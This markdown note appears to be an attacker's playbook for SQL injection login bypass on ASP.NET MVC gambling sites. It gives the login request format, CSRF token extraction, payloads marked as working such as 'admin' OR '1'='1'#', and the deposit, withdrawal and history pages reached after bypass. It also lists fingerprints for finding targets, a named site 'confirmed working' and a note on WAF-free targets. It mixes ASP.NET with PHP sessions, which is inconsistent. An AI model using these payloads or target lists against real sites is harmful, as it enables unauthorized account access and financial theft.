# ASP.NET MVC SQLi on Gambling Sites

## Login Endpoint
```
POST /Account/Login
Content-Type: application/x-www-form-urlencoded

__RequestVerificationToken={csrf}&Username={payload}&Password=test
```

## CSRF Token
Get from: `GET /Account/GetLoginForm?language=id`
Extract: `name="__RequestVerificationToken" value="..."`

## Working Payloads
```
admin' OR '1'='1'#     → Redirects to / (home) = SUCCESS
admin' OR 1=1#         → Redirects to / (home) = SUCCESS
admin' OR '1'='1       → Redirects to /home?login = FAIL
admin'--               → Redirects to /home?login = FAIL
```

**Key**: Must use `#` comment at the end. Without `#`, the login fails.

## Post-Login Access
After successful SQLi, ALL protected pages return 200 with full content:
- /deposit (deposit form)
- /withdraw (withdrawal form)
- /profile (user profile)
- /account (account settings)
- /history (transaction history)
- /bonus (bonus page)
- /referral (referral page)

## Detection
Look for:
- `__RequestVerificationToken` in login form
- `/Account/Login` endpoint
- `/Account/GetLoginForm` for form retrieval
- ASP.NET MVC patterns in headers or page source

## Example Sites
- linkzeus222f.com (ZEUS222) — Confirmed working
- Other white-label gambling sites using same platform

## Pitfalls
- **Cloudflare WAF blocks SQLi** — Only works on sites WITHOUT Cloudflare
- **CSRF token required** — Must extract fresh token for each attempt
- **Session-based** — Login state stored in PHP session cookies
- **SPA catch-all** — After login, page size increases (~600KB vs ~13KB)
